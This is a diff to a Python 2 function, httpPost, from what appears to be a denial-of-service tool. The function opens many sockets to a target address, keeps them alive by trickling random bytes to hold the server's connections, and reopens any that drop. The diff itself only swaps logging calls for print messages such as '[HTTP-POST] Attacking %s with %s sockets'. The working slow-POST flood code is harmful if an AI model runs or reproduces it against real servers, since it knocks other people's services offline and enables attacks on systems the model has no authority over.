@@ -44,33 +44,32 @@ def init_socket(ipDest, portDest):
 def httpPost(ID, portDest, ipDest, event, queue, n):
     
     nSockets = int(n)
-    logging.info("Attacking %s with %s sockets.", ipDest, n)
-    logging.info("Creating sockets...")
+    print"[HTTP-POST] Attacking %s with %s sockets.\n" %(ipDest, n)
+#    logging.info("Creating sockets...")
 
 
     for _ in range(nSockets):
         try:
-            logging.debug("Creating socket nr %s", _)
+            print "[HTTP-POST] Creating socket %s\n" %(_)
             s = init_socket(ipDest, int(portDest))
         except socket.error, exc:
-            logging.debug("Erro: %s", exc)
             break
         socketsList.append(s)
 
     while event.is_set():
-        logging.info("Sending keep-alive headers... \
-                Socket count: %s", len(socketsList))
+        #print "[HTTP-POST] Sending keep-alive headers... \
+        #       Socket count: %s\n" %(len(socketsList))
 
         for s in list(socketsList):
             try:
                 s.send(pack('!B', random.getrandbits(8)))
             except socket.error, exc:
-                logging.debug("Erro: %s", exc)
+                print"Erro: %s" %(exc)
                 socketsList.remove(s)
 
         for _ in range(nSockets - len(socketsList)):
-            logging.debug("Recreating socket...\
-                Socket count: %s", len(socketsList))
+            print "[HTTP-POST] Recreating socket...\
+                Socket count: %s\n" %(len(socketsList))
 
             try:
                 s = init_socket(ipDest, int(portDest))
@@ -79,5 +78,8 @@ def httpPost(ID, portDest, ipDest, event, queue, n):
             except socket.error:
                 break
         event.wait(timeout=15)
+
+    for _ in range(nSockets):
+        print "[HTTP-POST] Closing socket %s\n" %(_)
 
     queue.task_done()
